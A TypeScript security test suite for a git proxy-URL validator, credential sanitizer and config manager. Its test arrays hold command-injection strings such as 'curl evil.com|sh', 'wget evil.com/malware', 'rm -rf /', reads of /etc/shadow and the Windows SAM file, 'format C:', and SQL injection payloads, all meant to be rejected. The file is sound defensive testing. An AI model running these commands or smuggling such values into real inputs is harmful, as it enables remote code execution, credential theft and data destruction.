import * as assert from 'assert';
import * as fc from 'fast-check';
import { ProxyUrlValidator } from '../validation/ProxyUrlValidator';
import { InputSanitizer } from '../validation/InputSanitizer';
import { GitConfigManager } from '../config/GitConfigManager';

/**
 * Security Testing Suite
 * 
 * This test suite performs comprehensive security testing including:
 * - Fuzzing with malformed URLs
 * - Command injection pattern testing
 * - Credential leakage prevention verification
 * - Platform-specific escaping with dangerous inputs
 * 
 * Requirements: 1.1, 1.2, 1.3, 1.4, 6.1, 6.2, 6.3, 6.4, 6.5
 */
suite('Security Test Suite', () => {
    let validator: ProxyUrlValidator;
    let sanitizer: InputSanitizer;
    let gitConfigManager: GitConfigManager;

    setup(() => {
        validator = new ProxyUrlValidator();
        sanitizer = new InputSanitizer();
        gitConfigManager = new GitConfigManager();
    });

    suite('1. Fuzzing with Malformed URLs', () => {
        /**
         * Test various malformed URL patterns to ensure the validator
         * handles them gracefully without crashing or allowing invalid input.
         * 
         * Requirements: 1.1, 1.3, 1.4
         */
        
        test('should reject URLs with random garbage', () => {
            fc.assert(
                fc.property(
                    fc.string({ minLength: 1, maxLength: 100 }),
                    (garbage) => {
                        // Skip if it accidentally looks like a valid URL
                        if (garbage.startsWith('http://') || garbage.startsWith('https://')) {
                            return true;
                        }
                        
                        const result = validator.validate(garbage);
                        
                        // Should reject invalid URLs
                        assert.strictEqual(result.isValid, false,
                            `Random garbage should be rejected: ${garbage}`);
                        
                        // Should have error messages
                        assert.ok(result.errors.length > 0,
                            `Should have error messages for: ${garbage}`);
                    }
                ),
                { numRuns: 100 }
            );
        });

        test('should reject URLs with mixed valid/invalid components', () => {
            const malformedUrls = [
                'http://:8080',                          // Missing hostname
                'http://proxy.com:abc',                  // Non-numeric port
                'http://proxy.com:-1',                   // Negative port
                'http://proxy.com:999999',               // Port too large
                'http://proxy .com',                     // Space in hostname
                'http://proxy\ncom',                     // Newline in hostname
                'http://proxy\tcom',                     // Tab in hostname
                'http://proxy.com:8080:9090',            // Multiple ports
                'http://user:pass:extra@proxy.com',      // Extra colon in credentials
                'http://user@pass@proxy.com',            // Multiple @ symbols (unencoded)
                'http://[proxy.com]:8080',               // Invalid IPv6 format
            ];

            for (const url of malformedUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Malformed URL should be rejected: ${url}`);
                assert.ok(result.errors.length > 0,
                    `Should have error messages for: ${url}`);
            }
        });

        test('should reject URLs with control characters', () => {
            const controlChars = [
                '\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07',
                '\x08', '\x09', '\x0A', '\x0B', '\x0C', '\x0D', '\x0E', '\x0F',
                '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17',
                '\x18', '\x19', '\x1A', '\x1B', '\x1C', '\x1D', '\x1E', '\x1F',
            ];

            for (const char of controlChars) {
                const url = `http://proxy${char}com:8080`;
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `URL with control character (code ${char.charCodeAt(0)}) should be rejected`);
            }
        });

        test('should reject URLs with Unicode characters in hostname', () => {
            const unicodeUrls = [
                'http://プロキシ.com:8080',              // Japanese characters
                'http://代理.com:8080',                  // Chinese characters
                'http://прокси.com:8080',                // Cyrillic characters
                'http://proxy™.com:8080',                // Trademark symbol
                'http://proxy©.com:8080',                // Copyright symbol
                'http://proxy®.com:8080',                // Registered symbol
                'http://proxy€.com:8080',                // Euro symbol
                'http://proxy£.com:8080',                // Pound symbol
                'http://proxy¥.com:8080',                // Yen symbol
                'http://proxy😀.com:8080',               // Emoji
            ];

            for (const url of unicodeUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `URL with Unicode characters should be rejected: ${url}`);
            }
        });

        test('should handle extremely long URLs', () => {
            const longHostname = 'a'.repeat(1000);
            const url = `http://${longHostname}.com:8080`;
            
            const result = validator.validate(url);
            
            // Should either reject or handle gracefully (not crash)
            assert.ok(typeof result.isValid === 'boolean',
                'Should return a valid result for extremely long URL');
        });

        test('should handle URLs with excessive nesting', () => {
            const nestedPath = '/a'.repeat(100);
            const url = `http://proxy.com:8080${nestedPath}`;
            
            const result = validator.validate(url);
            
            // Should handle gracefully (not crash)
            assert.ok(typeof result.isValid === 'boolean',
                'Should return a valid result for URL with excessive nesting');
        });
    });

    suite('2. Command Injection Pattern Testing', () => {
        /**
         * Test various command injection patterns to ensure they are
         * properly detected and rejected by the validator.
         * 
         * Requirements: 1.1, 1.2
         */
        
        test('should reject common command injection patterns', () => {
            const injectionPatterns = [
                // Shell command separators
                'http://proxy.com;whoami',
                'http://proxy.com;rm -rf /',
                'http://proxy.com;cat /etc/passwd',
                'http://proxy.com|whoami',
                'http://proxy.com|cat /etc/passwd',
                'http://proxy.com&whoami',
                'http://proxy.com&&whoami',
                'http://proxy.com||whoami',
                
                // Command substitution
                'http://proxy.com`whoami`',
                'http://proxy.com$(whoami)',
                'http://proxy.com${whoami}',
                
                // Newline injection
                'http://proxy.com\nwhoami',
                'http://proxy.com\rwhoami',
                'http://proxy.com\r\nwhoami',
                
                // Redirection
                'http://proxy.com</etc/passwd',
                'http://proxy.com>/tmp/output',
                'http://proxy.com>>/tmp/output',
                'http://proxy.com 2>/dev/null',
                
                // Subshell execution
                'http://proxy.com(whoami)',
                'http://proxy.com(cat /etc/passwd)',
                
                // Complex injection attempts
                'http://proxy.com;curl evil.com|sh',
                'http://proxy.com;wget evil.com/malware',
                'http://proxy.com`curl evil.com`',
                'http://proxy.com$(curl evil.com)',
                
                // Windows-specific injection
                'http://proxy.com&dir',
                'http://proxy.com&type C:\\Windows\\System32\\config\\sam',
                'http://proxy.com|dir',
                
                // Encoded injection attempts
                'http://proxy.com%3Bwhoami',
                'http://proxy.com%0Awhoami',
                'http://proxy.com%0Dwhoami',
            ];

            for (const url of injectionPatterns) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Command injection pattern should be rejected: ${url}`);
                assert.ok(result.errors.some(e => 
                    e.toLowerCase().includes('metacharacter') || 
                    e.toLowerCase().includes('invalid')
                ), `Should mention security issue for: ${url}`);
            }
        });

        test('should reject injection in credentials', () => {
            const credentialInjections = [
                'http://user;whoami:pass@proxy.com',
                'http://user:pass;whoami@proxy.com',
                'http://user|whoami:pass@proxy.com',
                'http://user:pass|whoami@proxy.com',
                'http://user`whoami`:pass@proxy.com',
                'http://user:pass`whoami`@proxy.com',
                'http://user$(whoami):pass@proxy.com',
                'http://user:pass$(whoami)@proxy.com',
            ];

            for (const url of credentialInjections) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Credential injection should be rejected: ${url}`);
            }
        });

        test('should reject injection in port', () => {
            const portInjections = [
                'http://proxy.com:8080;whoami',
                'http://proxy.com:8080|whoami',
                'http://proxy.com:8080&whoami',
                'http://proxy.com:8080`whoami`',
            ];

            for (const url of portInjections) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Port injection should be rejected: ${url}`);
            }
        });

        test('should prevent injection via GitConfigManager', async function() {
            // Test that even if validation is bypassed, GitConfigManager
            // uses execFile which prevents shell interpretation
            
            const injectionUrl = 'http://proxy.com;whoami';
            
            // This should fail at validation level
            const validationResult = validator.validate(injectionUrl);
            assert.strictEqual(validationResult.isValid, false,
                'Validation should reject injection URL');
            
            // Even if we try to set it directly (bypassing validation),
            // GitConfigManager should handle it safely
            const result = await gitConfigManager.setProxy(injectionUrl);
            
            // It should either fail or handle safely (not execute the injection)
            // We can't easily test that the command wasn't executed,
            // but we can verify the operation completed without hanging
            assert.ok(typeof result.success === 'boolean',
                'GitConfigManager should handle injection attempt safely');
            
            // Clean up if it somehow succeeded
            if (result.success) {
                await gitConfigManager.unsetProxy();
            }
        });

        test('should reject path traversal attempts', () => {
            const traversalPatterns = [
                'http://proxy.com/../../../etc/passwd',
                'http://proxy.com/..\\..\\..\\windows\\system32',
                'http://proxy.com/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'http://proxy.com/....//....//....//etc/passwd',
            ];

            for (const url of traversalPatterns) {
                const result = validator.validate(url);
                // These might be valid URLs structurally, but should be handled safely
                // The key is that they don't cause command injection
                assert.ok(typeof result.isValid === 'boolean',
                    `Should handle path traversal safely: ${url}`);
            }
        });
    });

    suite('3. Credential Leakage Prevention', () => {
        /**
         * Verify that credentials are never exposed in logs, UI, or error messages.
         * 
         * Requirements: 6.1, 6.2, 6.3, 6.4, 6.5
         */
        
        test('should mask passwords in all contexts', () => {
            const testCases = [
                {
                    url: 'http://admin:secret123@proxy.com:8080',
                    password: 'secret123',
                    context: 'basic credentials'
                },
                {
                    url: 'http://user:P@ssw0rd!@proxy.com:8080',
                    password: 'P@ssw0rd!',
                    context: 'password with special characters'
                },
                {
                    url: 'http://test:verylongpassword123456789@proxy.com:8080',
                    password: 'verylongpassword123456789',
                    context: 'long password'
                },
                {
                    url: 'http://user:a@proxy.com:8080',
                    password: 'a',
                    context: 'single character password'
                },
            ];

            for (const testCase of testCases) {
                const masked = sanitizer.maskPassword(testCase.url);
                
                assert.ok(!masked.includes(testCase.password),
                    `Password should not appear in masked URL (${testCase.context}): ${masked}`);
                
                assert.ok(masked.includes('****'),
                    `Masked URL should contain asterisks (${testCase.context}): ${masked}`);
            }
        });

        test('should remove credentials completely when requested', () => {
            const testCases = [
                'http://admin:secret@proxy.com:8080',
                'http://user:pass@proxy.com',
                'https://test:password123@secure-proxy.example.com:3128',
            ];

            for (const url of testCases) {
                const cleaned = sanitizer.removeCredentials(url);
                
                // Should not contain @ symbol (indicating credentials removed)
                const parsedUrl = new URL(cleaned);
                assert.strictEqual(parsedUrl.username, '',
                    `Username should be removed: ${cleaned}`);
                assert.strictEqual(parsedUrl.password, '',
                    `Password should be removed: ${cleaned}`);
            }
        });

        test('should never log credentials in validation errors', () => {
            const urlsWithCredentials = [
                'http://admin:secret@proxy.com;whoami',
                'http://user:pass@proxy.com|cat',
                'http://test:password@proxy_invalid.com',
            ];

            for (const url of urlsWithCredentials) {
                const result = validator.validate(url);
                
                // Extract password from URL
                try {
                    const parsed = new URL(url);
                    const password = parsed.password;
                    
                    if (password) {
                        // Check that password doesn't appear in error messages
                        for (const error of result.errors) {
                            assert.ok(!error.includes(password),
                                `Password should not appear in error message: ${error}`);
                        }
                    }
                } catch {
                    // If URL is malformed, that's fine - we're testing error messages
                }
            }
        });

        test('should mask credentials in property-based fuzzing', () => {
            fc.assert(
                fc.property(
                    fc.constantFrom('http', 'https'),
                    fc.stringMatching(/^[a-zA-Z0-9_-]+$/).filter(s => s.length >= 3 && s.length <= 20),
                    fc.stringMatching(/^[a-zA-Z0-9_-]+$/).filter(s => s.length >= 5 && s.length <= 20),
                    fc.stringMatching(/^[a-zA-Z0-9.-]+$/).filter(s => s.length >= 5 && s.length <= 50),
                    (protocol, username, password, hostname) => {
                        // Skip if password is substring of username or hostname (false positive case)
                        // This is not a security issue - we're testing that the password field is masked
                        if (username.toLowerCase().includes(password.toLowerCase()) ||
                            hostname.toLowerCase().includes(password.toLowerCase())) {
                            return true;
                        }

                        const url = `${protocol}://${username}:${password}@${hostname}:8080`;

                        // Mask the password
                        const masked = sanitizer.maskPassword(url);

                        // Password should never appear in masked version
                        assert.ok(!masked.includes(password),
                            `Password '${password}' should not appear in: ${masked}`);

                        // Remove credentials
                        const cleaned = sanitizer.removeCredentials(url);

                        // Credentials must be removed from the URL userinfo (avoid false-positives from substrings in hostname)
                        assert.ok(!/^[a-z][a-z0-9+.-]*:\/\/[^/?#]*@/i.test(cleaned),
                            `Credentials should be removed from: ${cleaned}`);
                        assert.ok(!cleaned.includes(password),
                            `Password should be removed from: ${cleaned}`);
                    }
                ),
                { numRuns: 100 }
            );
        });
    });

    suite('4. Platform-Specific Escaping with Dangerous Inputs', () => {
        /**
         * Test that dangerous inputs are handled safely across different platforms.
         * 
         * Requirements: 1.1, 1.2, 1.3
         */
        
        test('should reject Windows-specific dangerous characters', () => {
            const windowsDangerousUrls = [
                'http://proxy.com&dir',
                'http://proxy.com|type C:\\file.txt',
                'http://proxy.com&del /F /Q C:\\*',
                'http://proxy.com&format C:',
                'http://proxy.com&shutdown /s',
                'http://proxy.com^&whoami',
            ];

            for (const url of windowsDangerousUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Windows dangerous pattern should be rejected: ${url}`);
            }
        });

        test('should reject Unix/Linux-specific dangerous characters', () => {
            const unixDangerousUrls = [
                'http://proxy.com;rm -rf /',
                'http://proxy.com|cat /etc/shadow',
                'http://proxy.com;sudo su',
                'http://proxy.com`id`',
                'http://proxy.com$(uname -a)',
                'http://proxy.com;chmod 777 /',
            ];

            for (const url of unixDangerousUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `Unix dangerous pattern should be rejected: ${url}`);
            }
        });

        test('should reject macOS-specific dangerous patterns', () => {
            const macosDangerousUrls = [
                'http://proxy.com;open /Applications/Calculator.app',
                'http://proxy.com|osascript -e "tell app"',
                'http://proxy.com;defaults write',
                'http://proxy.com;launchctl load',
            ];

            for (const url of macosDangerousUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `macOS dangerous pattern should be rejected: ${url}`);
            }
        });

        test('should handle platform-specific path separators safely', () => {
            const pathSeparatorUrls = [
                'http://proxy.com\\path\\to\\resource',      // Windows backslash
                'http://proxy.com/path/to/resource',         // Unix forward slash
                'http://proxy.com\\\\network\\share',        // UNC path
            ];

            for (const url of pathSeparatorUrls) {
                const result = validator.validate(url);
                // These should be handled safely (either accepted or rejected consistently)
                assert.ok(typeof result.isValid === 'boolean',
                    `Should handle path separator safely: ${url}`);
            }
        });

        test('should reject environment variable expansion attempts', () => {
            const envVarUrls = [
                'http://proxy.com/$HOME',
                'http://proxy.com/%USERPROFILE%',
                'http://proxy.com/${PATH}',
                'http://proxy.com/$USER',
                'http://proxy.com/%TEMP%',
                'http://proxy.com/~user',
            ];

            for (const url of envVarUrls) {
                const result = validator.validate(url);
                // These might be valid URLs structurally, but should not cause variable expansion
                assert.ok(typeof result.isValid === 'boolean',
                    `Should handle environment variable safely: ${url}`);
            }
        });

        test('should handle null bytes and other binary data', () => {
            const binaryUrls = [
                'http://proxy.com\x00',
                'http://proxy.com\x00\x00',
                'http://proxy\x00.com',
                'http://\x00proxy.com',
            ];

            for (const url of binaryUrls) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `URL with null bytes should be rejected: ${url.replace(/\x00/g, '\\x00')}`);
            }
        });

        test('should reject SQL injection-like patterns (defense in depth)', () => {
            const sqlPatterns = [
                "http://proxy.com'; DROP TABLE users--",
                "http://proxy.com' OR '1'='1",
                "http://proxy.com'; DELETE FROM config--",
                "http://proxy.com' UNION SELECT * FROM passwords--",
            ];

            for (const url of sqlPatterns) {
                const result = validator.validate(url);
                assert.strictEqual(result.isValid, false,
                    `SQL-like pattern should be rejected: ${url}`);
            }
        });

        test('should reject LDAP injection-like patterns (defense in depth)', () => {
            const ldapPatterns = [
                'http://proxy.com*',
                'http://proxy.com)(&',
                'http://proxy.com)(|',
                'http://proxy.com*)(',
            ];

            for (const url of ldapPatterns) {
                const result = validator.validate(url);
                // These should be rejected due to invalid characters
                assert.strictEqual(result.isValid, false,
                    `LDAP-like pattern should be rejected: ${url}`);
            }
        });
    });

    suite('5. Integration Security Tests', () => {
        /**
         * End-to-end security tests that verify the complete security chain.
         * 
         * Requirements: 1.1, 1.2, 1.3, 1.4, 6.1, 6.2, 6.3, 6.4, 6.5
         */
        
        test('should enforce validation before Git configuration', async function() {
            const dangerousUrl = 'http://proxy.com;whoami';
            
            // Validation should reject it
            const validationResult = validator.validate(dangerousUrl);
            assert.strictEqual(validationResult.isValid, false,
                'Validation should reject dangerous URL');
            
            // In a real application, this would be blocked by validation
            // But we test that GitConfigManager also handles it safely
            const result = await gitConfigManager.setProxy(dangerousUrl);
            
            // Should complete without executing the injection
            assert.ok(typeof result.success === 'boolean',
                'Should handle dangerous URL safely');
            
            // Clean up
            if (result.success) {
                await gitConfigManager.unsetProxy();
            }
        });

        test('should maintain security across multiple operations', async function() {
            const urlWithCredentials = 'http://admin:secret123@proxy.com:8080';
            
            // 1. Validate
            const validationResult = validator.validate(urlWithCredentials);
            if (!validationResult.isValid) {
                // If validation fails, that's fine - we're testing the security chain
                return;
            }
            
            // 2. Mask for display
            const masked = sanitizer.maskPassword(urlWithCredentials);
            assert.ok(!masked.includes('secret123'),
                'Password should be masked for display');
            
            // 3. Remove for logging
            const cleaned = sanitizer.removeCredentials(urlWithCredentials);
            assert.ok(!cleaned.includes('secret123'),
                'Password should be removed for logging');
            
            // 4. Set in Git (if Git is available)
            const setResult = await gitConfigManager.setProxy(urlWithCredentials);
            
            if (setResult.success) {
                // 5. Verify it was set correctly
                const getResult = await gitConfigManager.getProxy();
                assert.strictEqual(getResult, urlWithCredentials,
                    'URL should be stored correctly');
                
                // 6. Clean up
                await gitConfigManager.unsetProxy();
            }
        });

        test('should handle rapid-fire injection attempts', () => {
            const injectionAttempts = [
                'http://proxy.com;whoami',
                'http://proxy.com|cat',
                'http://proxy.com&dir',
                'http://proxy.com`id`',
                'http://proxy.com$(ls)',
            ];

            // Rapidly validate multiple injection attempts
            for (let i = 0; i < 10; i++) {
                for (const url of injectionAttempts) {
                    const result = validator.validate(url);
                    assert.strictEqual(result.isValid, false,
                        `Injection attempt should be rejected: ${url}`);
                }
            }
        });
    });
});
